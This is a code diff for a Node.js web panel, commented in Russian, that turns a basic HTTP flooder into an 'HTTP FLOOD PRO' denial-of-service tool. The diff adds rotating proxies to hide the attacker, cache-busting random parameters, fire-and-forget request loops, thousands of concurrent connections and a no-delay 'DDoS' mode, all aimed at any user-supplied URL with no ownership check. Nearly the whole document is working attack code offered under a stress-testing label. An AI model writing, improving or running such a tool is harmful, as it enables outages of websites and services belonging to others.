@@ -1,13 +1,15 @@
-// Подключение необходимых модулей
+// Усиленный HTTP-флудер с поддержкой прокси и нативными соединениями
 const express = require('express');
-const axios = require('axios');
-const path = require('path');
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const { HttpProxyAgent } = require('http-proxy-agent');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const app = express();
 app.use(express.json());
-app.use(express.static('public')); // для статических файлов, если потребуется
 
-// Глобальные переменные управления атакой
+// Глобальное состояние
 let attackActive = false;
 let stopFlag = false;
 let stats = {
@@ -17,8 +19,10 @@ let stats = {
   bytesSent: 0,
   active: false
 };
+let proxyList = []; // массив прокси в формате http://host:port
+let currentProxyIndex = 0;
 
-// Генерация случайной строки заданной длины
+// Генерация случайной строки
 function randomString(length) {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -28,79 +32,126 @@ function randomString(length) {
   return result;
 }
 
-// Создание случайных заголовков для запроса
-function randomHeaders() {
-  const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0'
-  ];
-  return {
-    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Accept-Encoding': 'gzip, deflate',
-    'Cache-Control': 'no-cache',
-    'Connection': 'keep-alive'
-  };
+// Создание агента для запросов с учётом прокси
+function getAgent(targetUrl) {
+  if (proxyList.length > 0) {
+    // Циклический выбор прокси
+    const proxy = proxyList[currentProxyIndex % proxyList.length];
+    currentProxyIndex++;
+    const isHttps = targetUrl.startsWith('https');
+    if (isHttps) {
+      return new HttpsProxyAgent(proxy);
+    } else {
+      return new HttpProxyAgent(proxy);
+    }
+  }
+  return undefined; // без прокси
 }
 
-// Функция одного потока: непрерывно отправляет запросы, пока не установлен stopFlag
-async function floodWorker(target, mode) {
-  const instance = axios.create({
-    timeout: 3000,
-    headers: randomHeaders(),
-    validateStatus: () => true // не выбрасывать ошибку при любом статусе
-  });
+// Основной рабочий поток: создаёт непрерывный поток HTTP-запросов с высокой конкуренцией
+function floodWorker(target, mode, connectionsPerWorker) {
+  const parsed = url.parse(target);
+  const isHttps = parsed.protocol === 'https:';
+  const transport = isHttps ? https : http;
   
-  while (!stopFlag) {
-    try {
-      let response;
-      const methodRand = Math.random();
-      if (methodRand < 0.7) { // GET запрос с случайным параметром
-        const param = randomString(8);
-        const url = `${target}?${param}=${Math.floor(Math.random() * 10000)}`;
-        response = await instance.get(url);
-      } else { // POST запрос с телом случайного размера
-        const payloadSize = Math.floor(Math.random() * 4096) + 512; // 512-4608 байт
-        const payload = { data: randomString(payloadSize) };
-        response = await instance.post(target, payload);
-      }
-      stats.totalRequests++;
-      stats.bytesSent += response.config.data ? Buffer.byteLength(response.config.data) : 0;
-      if (response.status < 400) {
-        stats.success++;
-      } else {
-        stats.failed++;
-      }
-    } catch (error) {
+  // Параметры запроса
+  const requestOptions = {
+    hostname: parsed.hostname,
+    port: parsed.port || (isHttps ? 443 : 80),
+    path: parsed.path || '/',
+    method: 'GET',
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      'Accept': '*/*',
+      'Connection': 'keep-alive'
+    }
+  };
+  
+  // Функция отправки одного запроса без ожидания ответа (огонь и забыл для максимальной скорости)
+  function fireRequest() {
+    // Добавляем случайный параметр, чтобы обойти кэш
+    const randPath = `${requestOptions.path}?${randomString(4)}=${Math.floor(Math.random()*10000)}`;
+    const options = { ...requestOptions, path: randPath, agent: getAgent(target) };
+    
+    const req = transport.request(options, (res) => {
+      // Собираем тело ответа для подсчёта трафика
+      res.on('data', (chunk) => {
+        stats.bytesSent += chunk.length;
+      });
+      res.on('end', () => {
+        stats.totalRequests++;
+        if (res.statusCode < 400) {
+          stats.success++;
+        } else {
+          stats.failed++;
+        }
+      });
+    });
+    
+    req.on('error', (err) => {
       stats.totalRequests++;
       stats.failed++;
-      // Игнорируем ошибки сети, продолжаем
+    });
+    
+    // Для POST-запросов иногда отправляем тело
+    if (Math.random() < 0.3) {
+      const payload = JSON.stringify({ data: randomString(1024) });
+      req.setHeader('Content-Type', 'application/json');
+      req.setHeader('Content-Length', Buffer.byteLength(payload));
+      req.write(payload);
     }
-    // В режиме DoS добавляем небольшую задержку между запросами
-    if (mode === 'dos') {
-      await new Promise(resolve => setTimeout(resolve, Math.random() * 50 + 10)); // 10-60 мс
-    }
-    // В режиме DDoS задержки нет — максимальная скорость
+    
+    req.end();
   }
+  
+  // В каждом воркере запускаем указанное количество параллельных "подпотоков" запросов
+  let stopped = false;
+  const localStop = () => { stopped = true; };
+  
+  // Создаём connectionsPerWorker функций, которые в цикле шлют запросы с микро-задержкой в dos-режиме
+  const loop = () => {
+    if (stopped || stopFlag) return;
+    fireRequest();
+    if (mode === 'dos') {
+      setTimeout(loop, Math.floor(Math.random() * 5) + 1); // 1-5 мс задержка
+    } else {
+      // DDoS режим: немедленный следующий запрос (setImmediate для избежания блокировки)
+      setImmediate(loop);
+    }
+  };
+  
+  // Запускаем несколько параллельных циклов в одном воркере
+  for (let i = 0; i < connectionsPerWorker; i++) {
+    loop();
+  }
+  
+  return localStop;
 }
 
-// Запуск атаки с заданным числом параллельных воркеров (потоков)
-function startAttack(target, threads, mode, duration) {
-  if (attackActive) return { success: false, message: 'Атака уже запущена' };
+// Запуск атаки
+function startAttack(target, threads, mode, duration, proxies, conPerWorker) {
+  if (attackActive) return { success: false, message: 'Атака уже активна' };
   
-  // Сброс статистики
+  // Установка прокси, если переданы
+  if (proxies && proxies.trim()) {
+    proxyList = proxies.split('\n').map(p => p.trim()).filter(p => p.length > 0);
+    currentProxyIndex = 0;
+  } else {
+    proxyList = [];
+  }
+  
   stats = { totalRequests: 0, success: 0, failed: 0, bytesSent: 0, active: true };
   attackActive = true;
   stopFlag = false;
   
-  // Запускаем N воркеров (асинхронных функций без ожидания)
+  const localStopFns = [];
+  
+  // Каждый высокоуровневый поток создаёт внутренние конкурентные соединения
   for (let i = 0; i < threads; i++) {
-    floodWorker(target, mode);
+    const stopFn = floodWorker(target, mode, conPerWorker || 10);
+    localStopFns.push(stopFn);
   }
   
-  // Если задана длительность, автоматически остановить через указанное время
   if (duration > 0) {
     setTimeout(() => {
       stopFlag = true;
@@ -109,10 +160,9 @@ function startAttack(target, threads, mode, duration) {
     }, duration * 1000);
   }
   
-  return { success: true, message: `Атака запущена: ${threads} потоков, режим ${mode.toUpperCase()}` };
+  return { success: true, message: `Запущено ${threads} потоков по ${conPerWorker||10} соединений, режим ${mode.toUpperCase()}` };
 }
 
-// Остановка атаки
 function stopAttack() {
   if (!attackActive) return { success: false, message: 'Нет активной атаки' };
   stopFlag = true;
@@ -121,81 +171,93 @@ function stopAttack() {
   return { success: true, message: 'Атака остановлена' };
 }
 
-// Маршруты веб-интерфейса
+// Веб-интерфейс
 app.get('/', (req, res) => {
-  // Отдаём HTML-интерфейс прямо из кода
   const html = `
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Stress Tester Panel</title>
+<title>Stress Tester Pro</title>
 <style>
-  body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-  .container { max-width: 700px; margin: 0 auto; }
-  h1 { text-align: center; text-shadow: 0 0 10px #0f0; }
-  .form-group { margin-bottom: 15px; }
-  label { display: block; margin-bottom: 5px; }
-  input, select, button { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; font-family: inherit; }
-  input[type="text"], input[type="number"] { width: 100%; }
-  button { cursor: pointer; margin-right: 10px; }
-  button:hover { background: #0f0; color: #000; }
-  button:disabled { opacity: 0.5; cursor: not-allowed; }
-  .stats { border: 1px solid #0f0; padding: 15px; margin-top: 20px; }
-  .stats span { font-weight: bold; }
-  .slider-container { display: flex; align-items: center; }
-  input[type="range"] { flex: 1; margin-right: 10px; }
+  body { background:#0a0a0a; color:#0f0; font-family:'Courier New',monospace; padding:20px; }
+  .container { max-width:800px; margin:0 auto; }
+  h1 { text-align:center; text-shadow:0 0 10px #0f0; }
+  .form-group { margin-bottom:15px; }
+  label { display:block; margin-bottom:5px; }
+  input, select, textarea, button { background:#1a1a1a; color:#0f0; border:1px solid #0f0; padding:8px 12px; font-family:inherit; }
+  input[type="text"], input[type="number"], textarea { width:100%; }
+  button { cursor:pointer; margin-right:10px; }
+  button:hover { background:#0f0; color:#000; }
+  button:disabled { opacity:0.5; cursor:not-allowed; }
+  .stats { border:1px solid #0f0; padding:15px; margin-top:20px; }
+  .stats span { font-weight:bold; }
+  .slider-container { display:flex; align-items:center; }
+  input[type="range"] { flex:1; margin-right:10px; }
+  textarea { height:80px; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>⚡ HTTP FLOOD TESTER ⚡</h1>
+  <h1>⚡ HTTP FLOOD PRO ⚡</h1>
   <div class="form-group">
     <label>Целевой URL</label>
     <input type="text" id="target" value="http://example.com" placeholder="http://...">
   </div>
   <div class="form-group">
-    <label>Количество потоков (мощность)</label>
+    <label>Потоков (воркеров)</label>
     <div class="slider-container">
       <input type="range" id="threadsSlider" min="10" max="500" value="100" oninput="document.getElementById('threadsVal').textContent=this.value">
       <span id="threadsVal">100</span>
     </div>
   </div>
   <div class="form-group">
-    <label>Режим атаки</label>
+    <label>Соединений на воркер (усиление)</label>
+    <div class="slider-container">
+      <input type="range" id="connPerWorker" min="1" max="50" value="10" oninput="document.getElementById('connVal').textContent=this.value">
+      <span id="connVal">10</span>
+    </div>
+    <small>Общее число одновременных соединений = потоки × это значение</small>
+  </div>
+  <div class="form-group">
+    <label>Режим</label>
     <select id="mode">
-      <option value="dos">DoS (умеренный)</option>
-      <option value="ddos">DDoS (максимальный)</option>
+      <option value="dos">DoS (умеренный, 1-5 мс задержка)</option>
+      <option value="ddos">DDoS (максимальный, без задержки)</option>
     </select>
   </div>
   <div class="form-group">
-    <label>Длительность (секунд, 0 = бесконечно)</label>
+    <label>Длительность (сек, 0=бесконечно)</label>
     <input type="number" id="duration" value="0" min="0">
+  </div>
+  <div class="form-group">
+    <label>Прокси (по одному на строку, http://ip:port)</label>
+    <textarea id="proxies" placeholder="http://1.2.3.4:8080
+http://5.6.7.8:3128"></textarea>
   </div>
   <div>
     <button id="startBtn" onclick="start()">ЗАПУСТИТЬ</button>
     <button id="stopBtn" onclick="stop()" disabled>СТОП</button>
   </div>
   <div class="stats">
-    <p>Всего запросов: <span id="req">0</span></p>
-    <p>Успешных: <span id="suc">0</span></p>
-    <p>Ошибок: <span id="err">0</span></p>
-    <p>Отправлено байт: <span id="bytes">0</span></p>
-    <p>Статус: <span id="status">Ожидание</span></p>
+    <p>Запросов: <span id="req">0</span> | Успешно: <span id="suc">0</span> | Ошибок: <span id="err">0</span></p>
+    <p>Трафик: <span id="bytes">0</span> байт | Статус: <span id="status">Ожидание</span></p>
   </div>
 </div>
 <script>
   function start() {
-    const target = document.getElementById('target').value;
-    const threads = document.getElementById('threadsSlider').value;
-    const mode = document.getElementById('mode').value;
-    const duration = document.getElementById('duration').value;
-    
     fetch('/api/start', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ target, threads: parseInt(threads), mode, duration: parseInt(duration) })
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        target: document.getElementById('target').value,
+        threads: parseInt(document.getElementById('threadsSlider').value),
+        conPerWorker: parseInt(document.getElementById('connPerWorker').value),
+        mode: document.getElementById('mode').value,
+        duration: parseInt(document.getElementById('duration').value),
+        proxies: document.getElementById('proxies').value
+      })
     })
     .then(r => r.json())
     .then(d => {
@@ -207,7 +269,6 @@ app.get('/', (req, res) => {
       }
     });
   }
-  
   function stop() {
     fetch('/api/stop')
     .then(r => r.json())
@@ -218,8 +279,6 @@ app.get('/', (req, res) => {
       }
     });
   }
-  
-  // Обновление статистики каждую секунду
   setInterval(() => {
     fetch('/api/stats')
     .then(r => r.json())
@@ -229,7 +288,6 @@ app.get('/', (req, res) => {
       document.getElementById('err').textContent = s.failed;
       document.getElementById('bytes').textContent = s.bytesSent;
       document.getElementById('status').textContent = s.active ? 'АКТИВНА' : 'Остановлена';
-      document.getElementById('status').style.color = s.active ? '#ff0' : '#0f0';
     });
   }, 1000);
 </script>
@@ -238,13 +296,12 @@ app.get('/', (req, res) => {
   res.send(html);
 });
 
-// API endpoints
 app.post('/api/start', (req, res) => {
-  const { target, threads, mode, duration } = req.body;
+  const { target, threads, mode, duration, proxies, conPerWorker } = req.body;
   if (!target || !target.startsWith('http')) {
     return res.json({ status: 'error', message: 'Некорректный URL' });
   }
-  const result = startAttack(target, threads || 100, mode || 'ddos', duration || 0);
+  const result = startAttack(target, parseInt(threads) || 100, mode || 'ddos', parseInt(duration) || 0, proxies, parseInt(conPerWorker) || 10);
   res.json({ status: result.success ? 'ok' : 'error', message: result.message });
 });
 
@@ -257,8 +314,7 @@ app.get('/api/stats', (req, res) => {
   res.json(stats);
 });
 
-// Запуск сервера на порту, указанном Render (или 3000 по умолчанию)
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Stress tester running on port ${PORT}`);
+  console.log(`Stress tester PRO running on port ${PORT}`);
 });
